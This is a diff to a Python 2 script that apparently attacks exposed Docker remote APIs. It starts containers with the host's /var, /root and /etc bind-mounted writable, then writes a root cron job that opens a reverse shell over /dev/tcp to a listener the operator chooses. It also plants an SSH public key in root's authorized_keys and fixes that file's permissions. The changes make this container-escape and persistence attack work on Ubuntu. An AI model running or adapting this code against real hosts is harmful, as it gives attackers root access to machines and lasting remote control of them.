@@ -1,7 +1,3 @@
-#-*- coding:utf-8 -*-
-#author:L.N.@insight-labs.org
-
-
 import urllib2
 import urllib
 import json
@@ -82,7 +78,7 @@ if __name__ == "__main__":
     key = 0
     version =''
     payload =''
-    sshkey = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCoecC7vmWn4s2y4T+Pc3bJ0owDYWzGIBTCWWonN4qMTCbe66hKopgtUuHC1y5H3HFQ0qsni0vFAGSoO4TLiIpvHUXbf9Wi9vR2q4oYphH9Kgsd3cVXsHUFcgybwdk5DCXpmoSJTlEoOrtWajYdyuALMy+CqpkwWDj+uTz+9/2P3T0Nh5F+U+UZOgSqIi5xQfUGJKGoFGXwvpqEL6UnGG4bbgGxVa5mJZVH0cxwKK6w7luezkcRVBEJ1SZAkjZOmZojyJbYQolItcBNBsXQ+cakjg3DeU69wrDiBdP+k2i2k3uzhJqJXfxLdxUZfjgXHwSOzDb2D5+841trASAwZAy1Gq4uwkbmwupe/qTPK2R31d5h4Jqx4N19eUjT8GkkDj+mnJTwYyOPJH/ghEvn4UfNOtohM2lZPbskvvskn82g0WzYJ5JnQaKfup1IYLTraBbJ5UdVYsCfG5ddRZF4xMab2ZDgcdqyISJxHPK9/P7w7mmgSut1nK5R1+HLSl/xDAPcoVd0H3ePqxN9ZD0BoMjY8fPxKAQR+bB5M05iDIIwUxhj2NQvCpwxxGwJXUSf13zirXRZhkZGnWrkNrzqHzpLZqoEBCEORErmFAvsI8yIBvThSylReiwhAWkdL7ONQ4dd7UgsQfY/0MMfxd8/V+041I1sIVUVBnHYUUwqE0eZ9Q== wanniba@wanniba.com'
+    sshkey = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQClkFaGdsYMiDdXgnoucv6HG42ydk1IJS3oBGUu0uBkCXds6eVVaEmqe/HY4ICUPIyaoynJl7sIs9Ktuu1B91QIWYsbbMAtMN4v4ZZXWQ0gKTokUhGcjMuyJUHGiHWKEwqKpDGeB15EtS0wstO273PmaFLAnKY6lyAvpY9/Sgfq6UrGQnBR1P2BAg31UWsXKiBqUqunbTuicZPvQUdLW+iKzIDegjonZZDwiW9Ak5Bn6bSOahUR6gg827fkxX7TLj4cSna7RyKrL5ERw61mHqRpdvMjhJAvAz24kJWYC5kDDyxi+7HYRDKophEk7ORTt18QeuoiW55XjGx2jHzoDZtp'
     for op, value in opts:
         if op =="-l":
             imagesList = 1
@@ -118,7 +114,8 @@ if __name__ == "__main__":
             key = 1
             
     if isset('lhsot') and isset('lport'):
-        payload = '/bin/bash -c "echo \\\"*/1 * * * * /bin/bash -i >& /dev/tcp/'+lhsot+'/'+lport+' 0>&1\\\" >> /tmp/spool/cron/crontabs/root"' #ubuntu failure,beacuse It need to restart the cron or system
+        #payload = '/bin/bash -c "echo \\\"*/1 * * * * /bin/bash -i >& /dev/tcp/'+lhsot+'/'+lport+' 0>&1\\\" >> /tmp/spool/cron/crontabs/root"' #ubuntu failure,beacuse It need to restart the cron or system
+        payload = '/bin/bash -c "echo \\\"*/1 * * * * root /bin/bash -i >& /dev/tcp/'+lhsot+'/'+lport+' 0>&1\\\" >> /tmp2/crontab"' #ubuntu 
         #payload = '/bin/bash -c "echo \\\"*/1 * * * * /bin/bash -i >& /dev/tcp/'+lhsot+'/'+lport+' 0>&1\\\" >> /tmp/spool/cron/root"'  #centos,redhat and so on
         print "[-]Paylaod: "+payload
     if sshkey !='' and key == 1:
@@ -136,12 +133,15 @@ if __name__ == "__main__":
                 print "RepoTags: "+info['RepoTags'][0]
         elif isset('createContainer') and isset('imageName'):
             cli = createClient(host,port,version)
-            container = cli.create_container(image=imageName, command='/bin/bash', tty=True, volumes=['/tmp','/tmp1'], host_config=cli.create_host_config(binds=['/var:/tmp:rw','/root:/tmp1:rw']))
+            container = cli.create_container(image=imageName, command='/bin/bash', tty=True, volumes=['/tmp','/tmp1','/tmp2'], host_config=cli.create_host_config(binds=['/var:/tmp:rw','/root:/tmp1:rw','/etc:/tmp2:rw']))
             print "[-]Container ID:"+container['Id']
             print "[-]Warning:"+str(container['Warnings'])
             response = cli.start(container=container.get('Id'))
             if payload != '':
                 print cli.exec_start(exec_id=cli.exec_create(container=container.get('Id'), cmd=payload))
+                if key == 1:
+                    cli.exec_start(exec_id=cli.exec_create(container=container.get('Id'), cmd='chmod 600 /tmp1/.ssh/authorized_keys'))
+                    print "[-]chmod 600 authorized_keys ......"
         elif isset('closeContainer') and isset('imageId'):
             cli = createClient(host,port,version)
             cli.stop(container=imageId)
